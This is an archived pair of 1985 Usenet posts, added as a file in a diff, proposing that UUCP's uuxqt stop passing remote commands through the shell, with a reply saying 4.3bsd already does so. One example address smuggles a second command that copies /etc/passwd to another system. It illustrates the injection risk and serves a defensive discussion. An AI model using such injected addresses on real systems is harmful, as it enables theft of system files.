@@ -1,0 +1,136 @@
+From wuphys!wucs!busch!we53!mgnetp!ihnp4!cbosgd!mark Mon Aug 12 09:51:42 CDT 1985
+Article 337 of net.bugs.uucp:
+Relay-Version: version B 2.10.3 4.3bsd-beta 6/6/85; site plus5.UUCP
+Posting-Version: version B 2.10.3 alpha 5/22/85; site cbosgd.UUCP
+Path: plus5!wuphys!wucs!busch!we53!mgnetp!ihnp4!cbosgd!mark
+>From: mark@cbosgd.UUCP (Mark Horton)
+Newsgroups: net.unix-wizards,net.mail,net.bugs.uucp
+Subject: A radical idea - taking shell functionality out of uuxqt
+Message-ID: <1391@cbosgd.UUCP>
+Date: 11 Aug 85 19:48:39 GMT
+Date-Received: 12 Aug 85 07:33:29 GMT
+Organization: AT&T Bell Laboratories, Columbus, Oh
+Lines: 96
+Xref: plus5 net.unix-wizards:6469 net.mail:486 net.bugs.uucp:337
+
+I've been working on a proposal for representing MHS X.400
+electronic mailing addresses as ASCII text in such a way that
+it is possible to gateway between the two systems.  In doing
+this work, I'm finding that there are some pretty severe constraints
+put on what characters can be in mailing addresses, because of
+the way UUCP mail is transmitted.
+
+When one sends mail via UUCP, the mechanism is that the user interface
+creates a character string, which is passed as an argument to a mail
+transport agent such as /bin/mail or /usr/lib/sendmail.  This program
+in turn invokes uux, again passing the address as an argument.  The
+message is spooled in a D. file, eventually copied to the remote system,
+and uuxqt is run.  The resulting rmail command is passed to the shell,
+which invokes rmail which repeats the process for the next hop.
+
+Now, suppose I have a message that has an & in it, or some quotes around
+part of the address, or spaces in the address, such as
+	mhsgate!MHS!/O=AT&T/PN=John Smith
+or
+	mhsgate!cs.cmu.edu!"John Smith"
+When uuxqt invokes rmail, it does so using the shell.  The shell will see
+the & or the quotes or the blanks and get very upset.  Even if it doesn't get
+upset, it mungs the address.  The quotes get stripped out, so they are gone
+by the time the next hop in the UUCP path sees them.
+
+I find myself in a position where I have to avoid large numbers of characters
+because the UNIX shell eats them.  The list of characters I have to avoid on
+account of UNIX is
+	#	(at the beginning of words)
+	$^&*()`~\|[];'"<>?
+		(blank)
+This is a pretty long list.  It's especially embarrasing because no other
+operating system imposes any such constraints, and it makes UNIX look
+pretty silly.  ("Well, I'm sorry, we can't use the documented quoting
+conventions of RFC822 for this international standard that applies to
+all operating systems because the UNIX shell gets in the way.")
+
+We can invent ways to get these characters into addresses at the user
+interface level.  The person typing in the message can put quotes around
+the address:
+	$ mail "mhsgate!MHS!/O=AT&T/PN=John Smith"
+	$ mail 'mhsgate!cs.cmu.edu!"John Smith"'
+Or we can alter the user interfaces to do what almost every other operating
+system does: prompt the user for the addresses after the program starts up:
+	$ sndmsg
+	To: {user types in destinations here}
+	Subject: {etc}
+
+The real problem here is that our transport mechanism is not capable of
+passing more than a very restricted set of addresses.  There is nothing
+I can do at one end to get an ampersand to show up in an address N
+hops down the line.  Especially if I don't know what N is because I
+don't know who will do rerouting or forwarding.
+
+There is a fair amount of code in uuxqt to make sure that you don't put
+trojan horses in mail addresses to trick the shell, thus
+	mail "foo!user;uucp /etc/passwd mysys!~/passwd"
+is prevented.  This code is probably impossible to get exactly right,
+and some clever person usually finds a way to get past every new
+wonderful version of UUCP that comes out.
+
+uux was originally designed as a very general purpose remote execution
+mechanism, not unlike the various network remote execution commands
+you see for LAN's.  So it had to invoke the shell on the remote end so
+you could do things like
+	uux foo!"grep foo bar > mumble; diff oldumumble mumble | mail somebody"
+However, in practice, as far as I can tell, nobody does this anymore.
+For reasons of security, and because stdout of the uux command is
+usually thrown in the bit bucket anyway, uux has been reduced to
+rmail, rnews, and a few batch commands like lpr.  These commands take
+either no arguments or very simple ones, and read stdin for data.
+
+What I propose is that all this shell functionality be taken out of
+uuxqt, and that it just directly exec the command.  Not only would
+there be a tremendous security enhancement, but the major cause of
+the character problem outlined above would go away.
+
+(It doesn't completely solve my problem for a number of reasons.  The
+main one is that any change made now won't be in common use for years.
+It also doesn't solve the problem with blanks, although I suspect that
+solutions are possible.  Also, there are other programs that may invoke
+shells, such as rmail, smail, and sendmail, although I think these
+programs either do direct execs or put quotes around their arguments.
+But it's a good start down the road to eventually solving this.)
+
+What I'm wondering is this.  What I'm proposing breaks programs that
+really use the shell on the remote end.  I can't think of a case where
+this matters.  (Note that I'm just proposing that uux and uuxqt be
+changed, uucp will continue to understand things like ~user and dir/*.)
+Is there anyone out there that really uses this feature, and if so would
+you be willing to turn it on explicitly, say with an extra option to uux?
+
+Are Honey, Dan, Ber, Rick, and anyone else who supports a UUCP listening?
+What do you think?
+
+	Mark
+
+
+From wuphys!wucs!busch!we53!mgnetp!ihnp4!mhuxn!mhuxr!ulysses!gatech!seismo!rick Wed Aug 14 09:50:18 CDT 1985
+Article 494 of net.mail:
+Relay-Version: version B 2.10.3 4.3bsd-beta 6/6/85; site plus5.UUCP
+Posting-Version: version B 2.10.3 4.3bsd-beta 6/6/85; site seismo.UUCP
+Path: plus5!wuphys!wucs!busch!we53!mgnetp!ihnp4!mhuxn!mhuxr!ulysses!gatech!seismo!rick
+>From: rick@seismo.UUCP (Rick Adams)
+Newsgroups: net.unix-wizards,net.mail,net.bugs.uucp
+Subject: Re: A radical idea - taking shell functionality out of uuxqt
+Message-ID: <2976@seismo.UUCP>
+Date: 13 Aug 85 18:26:18 GMT
+Date-Received: 14 Aug 85 10:52:34 GMT
+References: <1391@cbosgd.UUCP>
+Organization: Center for Seismic Studies, Arlington, VA
+Lines: 4
+Summary: 4.3bsd uucp doesn't use a shell
+Xref: plus5 net.unix-wizards:6505 net.mail:494 net.bugs.uucp:341
+
+The 4.3bsd uucp already executes the command directly. It's a big security
+win and saves a lot of fork/execs on a system that does a lot of uucp.
+
+---rick
+
+
